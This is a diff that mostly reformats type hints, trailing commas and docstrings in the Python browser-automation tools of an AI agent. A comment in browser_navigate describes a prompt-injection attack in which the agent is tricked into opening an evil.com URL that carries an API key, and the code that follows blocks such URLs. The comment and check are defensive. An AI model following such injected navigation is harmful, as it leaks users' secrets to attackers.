+                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}",
                         }
             elif returncode != 0:
                 # Check for errors
@@ -2326,7 +2331,7 @@ def _run_browser_command(
 
 def _extract_relevant_content(
     snapshot_text: str,
-    user_task: Optional[str] = None
+    user_task: str | None = None,
 ) -> str:
     """Use LLM to extract relevant content from a snapshot based on the user's task.
 
@@ -2393,11 +2398,12 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 
     Returns:
         Truncated text with indicator if truncated
+
     """
     if len(snapshot_text) <= max_chars:
         return snapshot_text
 
-    lines = snapshot_text.split('\n')
+    lines = snapshot_text.split("\n")
     result: list[str] = []
     chars = 0
     for line in lines:
@@ -2407,17 +2413,16 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
         chars += len(line) + 1
     remaining = len(lines) - len(result)
     if remaining > 0:
-        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
-    return '\n'.join(result)
+        result.append(f"\n[... {remaining} more lines truncated, use browser_snapshot for full content]")
+    return "\n".join(result)
 
 
 # ============================================================================
 # Browser Tool Functions
 # ============================================================================
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
-    """
-    Navigate to a URL in the browser.
+def browser_navigate(url: str, task_id: str | None = None) -> str:
+    """Navigate to a URL in the browser.
 
     Args:
         url: The URL to navigate to
@@ -2425,12 +2430,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
+
     """
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
+
     from agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
@@ -2565,7 +2572,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         response = {
             "success": True,
             "url": final_url,
-            "title": title
+            "title": title,
         }
         _copy_fallback_warning(response, result)
 
@@ -2575,7 +2582,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "blocked", "bot detected", "verification required",
             "please verify", "are you a robot", "captcha",
             "cloudflare", "ddos protection", "checking your browser",
-            "just a moment", "attention required"
+            "just a moment", "attention required",
         ]
         title_lower = title.lower()
 
@@ -2616,20 +2623,18 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             logger.debug("Auto-snapshot after navigate failed: %s", e)
 
         return json.dumps(response, ensure_ascii=False)
-    else:
-        return json.dumps({
-            "success": False,
-            "error": result.get("error", "Navigation failed")
-        }, ensure_ascii=False)
+    return json.dumps({
+        "success": False,
+        "error": result.get("error", "Navigation failed"),
+    }, ensure_ascii=False)
 
 
 def browser_snapshot(
     full: bool = False,
-    task_id: Optional[str] = None,
-    user_task: Optional[str] = None
+    task_id: str | None = None,
+    user_task: str | None = None,
 ) -> str:
-    """
-    Get a text-based snapshot of the current page's accessibility tree.
+    """Get a text-based snapshot of the current page's accessibility tree.
 
     Args:
         full: If True, return complete snapshot. If False, return compact view.
@@ -2638,6 +2643,7 @@ def browser_snapshot(
 
     Returns:
         JSON string with page snapshot
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_snapshot
@@ -2666,7 +2672,7 @@ def browser_snapshot(
         response = {
             "success": True,
             "snapshot": snapshot_text,
-            "element_count": len(refs) if refs else 0
+            "element_count": len(refs) if refs else 0,
         }
         _copy_fallback_warning(response, result)
 
@@ -2674,7 +2680,9 @@ def browser_snapshot(
         # supervisor is attached to this task. No-op otherwise. See
         # website/docs/developer-guide/browser-supervisor.md.
         try:
-            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+            from tools.browser_supervisor import (
+                SUPERVISOR_REGISTRY,  # type: ignore[import-not-found]
+            )
             _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
             if _supervisor is not None:
                 _sv_snap = _supervisor.snapshot()
@@ -2684,17 +2692,15 @@ def browser_snapshot(
             logger.debug("supervisor snapshot merge failed: %s", _sv_exc)
 
         return json.dumps(response, ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to get snapshot")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    response = {
+        "success": False,
+        "error": result.get("error", "Failed to get snapshot"),
+    }
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_click(ref: str, task_id: Optional[str] = None) -> str:
-    """
-    Click on an element.
+def browser_click(ref: str, task_id: str | None = None) -> str:
+    """Click on an element.
 
     Args:
         ref: Element reference (e.g., "@e5")
@@ -2702,6 +2708,7 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
 
     Returns:
         JSON string with click result
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_click
@@ -2718,20 +2725,18 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     if result.get("success"):
         response = {
             "success": True,
-            "clicked": ref
+            "clicked": ref,
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to click {ref}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    response = {
+        "success": False,
+        "error": result.get("error", f"Failed to click {ref}"),
+    }
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
-    """
-    Type text into an input field.
+def browser_type(ref: str, text: str, task_id: str | None = None) -> str:
+    """Type text into an input field.
 
     Args:
         ref: Element reference (e.g., "@e3")
@@ -2740,6 +2745,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
 
     Returns:
         JSON string with type result
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_type
@@ -2758,20 +2764,18 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         response = {
             "success": True,
             "typed": text,
-            "element": ref
+            "element": ref,
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to type into {ref}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    response = {
+        "success": False,
+        "error": result.get("error", f"Failed to type into {ref}"),
+    }
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
-    """
-    Scroll the page.
+def browser_scroll(direction: str, task_id: str | None = None) -> str:
+    """Scroll the page.
 
     Args:
         direction: "up" or "down"
@@ -2779,12 +2783,13 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
 
     Returns:
         JSON string with scroll result
+
     """
     # Validate direction
     if direction not in {"up", "down"}:
         return json.dumps({
             "success": False,
-            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
+            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'.",
         }, ensure_ascii=False)
 
     # Single scroll with pixel amount instead of 5x subprocess calls.
@@ -2807,26 +2812,26 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     if not result.get("success"):
         response = {
             "success": False,
-            "error": result.get("error", f"Failed to scroll {direction}")
+            "error": result.get("error", f"Failed to scroll {direction}"),
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
     response = {
         "success": True,
-        "scrolled": direction
+        "scrolled": direction,
     }
     return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_back(task_id: Optional[str] = None) -> str:
-    """
-    Navigate back in browser history.
+def browser_back(task_id: str | None = None) -> str:
+    """Navigate back in browser history.
 
     Args:
         task_id: Task identifier for session isolation
 
     Returns:
         JSON string with navigation result
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_back
@@ -2839,20 +2844,18 @@ def browser_back(task_id: Optional[str] = None) -> str:
         data = result.get("data", {})
         response = {
             "success": True,
-            "url": data.get("url", "")
+            "url": data.get("url", ""),
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to go back")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    response = {
+        "success": False,
+        "error": result.get("error", "Failed to go back"),
+    }
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_press(key: str, task_id: Optional[str] = None) -> str:
-    """
-    Press a keyboard key.
+def browser_press(key: str, task_id: str | None = None) -> str:
+    """Press a keyboard key.
 
     Args:
         key: Key to press (e.g., "Enter", "Tab")
@@ -2860,6 +2863,7 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
 
     Returns:
         JSON string with key press result
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_press
@@ -2871,21 +2875,17 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
     if result.get("success"):
         response = {
             "success": True,
-            "pressed": key
+            "pressed": key,
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to press {key}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    response = {
+        "success": False,
+        "error": result.get("error", f"Failed to press {key}"),
+    }
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-
-
-
-def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
+def browser_console(clear: bool = False, expression: str | None = None, task_id: str | None = None) -> str:
     """Get browser console messages and JavaScript errors, or evaluate JS in the page.
 
     When ``expression`` is provided, evaluates JavaScript in the page context
@@ -2899,6 +2899,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
     Returns:
         JSON string with console messages/errors, or eval result
+
     """
     # --- JS evaluation mode ---
     if expression is not None:
@@ -2947,7 +2948,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
     return json.dumps(response, ensure_ascii=False)
 
 
-def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
+def _browser_eval(expression: str, task_id: str | None = None) -> str:
     """Evaluate a JavaScript expression in the page context and return the result."""
     if _is_camofox_mode():
         return _camofox_eval(expression, task_id)
@@ -2961,7 +2962,9 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     # subprocess path on any error so behaviour is unchanged when no
     # supervisor is running (e.g. plain agent-browser without a CDP backend).
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from tools.browser_supervisor import (
+            SUPERVISOR_REGISTRY,  # type: ignore[import-not-found]
+        )
         supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
         if supervisor is not None:
             sup_result = supervisor.evaluate_runtime(expression)
@@ -3053,7 +3056,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)
 
 
-def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
+def _camofox_eval(expression: str, task_id: str | None = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
     from tools.browser_camofox import _ensure_tab, _post
     try:
@@ -3136,15 +3139,15 @@ def _maybe_stop_recording(task_id: str):
             _recording_sessions.discard(task_id)
 
 
-def browser_get_images(task_id: Optional[str] = None) -> str:
-    """
-    Get all images on the current page.
+def browser_get_images(task_id: str | None = None) -> str:
+    """Get all images on the current page.
 
     Args:
         task_id: Task identifier for session isolation
 
     Returns:
         JSON string with list of images (src and alt)
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_get_images
@@ -3178,7 +3181,7 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
             response = {
                 "success": True,
                 "images": images,
-                "count": len(images)
+                "count": len(images),
             }
             return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
         except json.JSONDecodeError:
@@ -3186,20 +3189,19 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
                 "success": True,
                 "images": [],
                 "count": 0,
-                "warning": "Could not parse image data"
+                "warning": "Could not parse image data",
             }
             return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
     else:
         response = {
             "success": False,
-            "error": result.get("error", "Failed to get images")
+            "error": result.get("error", "Failed to get images"),
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
-    """
-    Take a screenshot of the current page for visual inspection.
+def browser_vision(question: str, annotate: bool = False, task_id: str | None = None) -> str | dict[str, Any]:
+    """Take a screenshot of the current page for visual inspection.
 
     Captures what's visually displayed in the browser. When the active model
     supports native vision, the screenshot is attached directly to the
@@ -3219,6 +3221,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     Returns:
         A JSON string with vision analysis results and screenshot_path, or a
         multimodal tool-result envelope carrying the screenshot and metadata.
+
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_vision
@@ -3226,6 +3229,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
     import base64
     import uuid as uuid_mod
+
     from hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
@@ -3253,7 +3257,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             _lp_prerouted = True
             _lp_fallback_warning = fb_result.get("fallback_warning")
             fb_path = fb_result.get("data", {}).get("path", "")
-            if fb_path and os.path.exists(fb_path):
+            if fb_path and Path(fb_path).exists():
                 from hermes_constants import get_hermes_dir
                 screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
                 screenshots_dir.mkdir(parents=True, exist_ok=True)
@@ -3316,7 +3320,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
             error_response = {
                 "success": False,
-                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
+                "error": f"Failed to take screenshot ({mode} mode): {error_detail}",
             }
             return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)
 
@@ -3412,7 +3416,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
                         {"type": "text", "text": vision_prompt},
                         {"type": "image_url", "image_url": {"url": data_url}},
                     ],
-                }
+                },
             ],
             "max_tokens": 2000,
             "temperature": vision_temperature,
@@ -3425,7 +3429,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             response = call_llm(**call_kwargs)
         except Exception as _api_err:
             from tools.vision_tools import (
-                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
+                _RESIZE_TARGET_BYTES,
+                _is_image_size_error,
+                _resize_image_for_vision,
             )
             if (_is_image_size_error(_api_err)
                     and len(data_url) > _RESIZE_TARGET_BYTES):
@@ -3463,11 +3469,11 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         # screenshot loses evidence the user might need.  The 24-hour cleanup
         # in _cleanup_old_screenshots prevents unbounded disk growth.
         logger.warning("browser_vision failed: %s", e, exc_info=True)
-        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
+        error_info = {"success": False, "error": f"Error during vision analysis: {e!s}"}
         if screenshot_path.exists():
             error_info["screenshot_path"] = str(screenshot_path)
             error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
-        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
+        _copy_fallback_warning(error_info, result if "result" in locals() else {})
         return json.dumps(error_info, ensure_ascii=False)
 
 
@@ -3517,9 +3523,8 @@ def _cleanup_old_recordings(max_age_hours=72):
 # Cleanup and Management Functions
 # ============================================================================
 
-def cleanup_browser(task_id: Optional[str] = None) -> None:
-    """
-    Clean up browser session(s) for a task.
+def cleanup_browser(task_id: str | None = None) -> None:
+    """Clean up browser session(s) for a task.
 
     Called automatically when a task completes or when inactivity timeout is reached.
     Closes both the agent-browser/Browserbase session and Camofox sessions.
@@ -3532,6 +3537,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
 
     Args:
         task_id: Task identifier (or explicit session key)
+
     """
     if task_id is None:
         task_id = "default"
@@ -3617,10 +3623,10 @@ def _cleanup_single_browser_session(task_id: str) -> None:
         session_name = session_info.get("session_name", "")
         if session_name:
             socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
-            if os.path.exists(socket_dir):
+            if Path(socket_dir).exists():
                 # agent-browser writes {session}.pid in the socket dir
                 pid_file = os.path.join(socket_dir, f"{session_name}.pid")
-                if os.path.isfile(pid_file):
+                if Path(pid_file).is_file():
                     try:
                         from tools.process_registry import ProcessRegistry
                         daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
@@ -3636,8 +3642,7 @@ def _cleanup_single_browser_session(task_id: str) -> None:
 
 
 def cleanup_all_browsers() -> None:
-    """
-    Clean up all active browser sessions.
+    """Clean up all active browser sessions.
 
     Useful for cleanup on shutdown.
     """
@@ -3648,16 +3653,15 @@ def cleanup_all_browsers() -> None:
 
     # Tear down CDP supervisors for all tasks so background threads exit.
     try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        from tools.browser_supervisor import (
+            SUPERVISOR_REGISTRY,  # type: ignore[import-not-found]
+        )
         SUPERVISOR_REGISTRY.stop_all()
     except Exception:
         pass
 
     # Reset cached lookups so they are re-evaluated on next use.
-    global _cached_agent_browser, _agent_browser_resolved
-    global _cached_command_timeout, _command_timeout_resolved
-    global _cached_chromium_installed
-    global _cached_browser_engine, _browser_engine_resolved
+    global _cached_agent_browser, _agent_browser_resolved, _cached_command_timeout, _command_timeout_resolved, _cached_chromium_installed, _cached_browser_engine, _browser_engine_resolved
     _cached_agent_browser = None
     _agent_browser_resolved = False
     _discover_homebrew_node_dirs.cache_clear()
@@ -3673,10 +3677,10 @@ def cleanup_all_browsers() -> None:
 
 
 # Cache for Chromium discovery. Invalidated by _reset_browser_caches.
-_cached_chromium_installed: Optional[bool] = None
+_cached_chromium_installed: bool | None = None
 
 
-def _chromium_search_roots() -> List[str]:
+def _chromium_search_roots() -> list[str]:
     """Directories to scan for a Chromium / headless-shell build.
 
     Order mirrors what agent-browser and Playwright actually probe:
@@ -3688,7 +3692,7 @@ def _chromium_search_roots() -> List[str]:
     4. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` — Playwright's default
        on Windows.
     """
-    roots: List[str] = []
+    roots: list[str] = []
     env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
     if env_path and env_path != "0":
         roots.append(env_path)
@@ -3698,7 +3702,7 @@ def _chromium_search_roots() -> List[str]:
         roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
     if sys.platform == "win32":
         local = os.environ.get("LOCALAPPDATA") or os.path.join(
-            home, "AppData", "Local"
+            home, "AppData", "Local",
         )
         roots.append(os.path.join(local, "ms-playwright"))
     return roots
@@ -3729,10 +3733,9 @@ def _chromium_installed() -> bool:
 
     # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
     ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
-    if ab_path:
-        if os.path.isfile(ab_path) or shutil.which(ab_path):
-            _cached_chromium_installed = True
-            return True
+    if ab_path and (Path(ab_path).is_file() or shutil.which(ab_path)):
+        _cached_chromium_installed = True
+        return True
 
     # 2. System Chrome/Chromium in PATH (common names)
     system_chrome = (
@@ -3747,7 +3750,7 @@ def _chromium_installed() -> bool:
 
     # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
     for root in _chromium_search_roots():
-        if not root or not os.path.isdir(root):
+        if not root or not Path(root).is_dir():
             continue
         try:
             entries = os.listdir(root)
@@ -3757,7 +3760,7 @@ def _chromium_installed() -> bool:
         # ``chromium_headless_shell-<build>``; agent-browser accepts either.
         for entry in entries:
             if entry.startswith("chromium-") or entry.startswith(
-                "chromium_headless_shell-"
+                "chromium_headless_shell-",
             ):
                 _cached_chromium_installed = True
                 return True
@@ -3768,18 +3771,17 @@ def _chromium_installed() -> bool:
 
 def _running_in_docker() -> bool:
     """Best-effort detection of whether we're inside a Docker container."""
-    if os.path.exists("/.dockerenv"):
+    if Path("/.dockerenv").exists():
         return True
     try:
-        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
+        with Path("/proc/1/cgroup").open(encoding="utf-8") as fp:
             return "docker" in fp.read()
     except OSError:
         return False
 
 
 def check_browser_requirements() -> bool:
-    """
-    Check if browser tool requirements are met.
+    """Check if browser tool requirements are met.
 
     In **local mode** (no cloud provider configured): the ``agent-browser``
     CLI must be findable. Chrome/Chromium is required for the default Chrome
@@ -3792,6 +3794,7 @@ def check_browser_requirements() -> bool:
 
     Returns:
         True if all requirements are met, False otherwise
+
     """
     # Camofox backend — only needs the server URL, no agent-browser CLI
     if _is_camofox_mode():
@@ -3885,7 +3888,7 @@ if __name__ == "__main__":
                 if _running_in_docker():
                     print(
                         "     Docker: pull the latest image — the current one "
-                        "predates the bundled Chromium install"
+                        "predates the bundled Chromium install",
                     )
                     print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                 else:
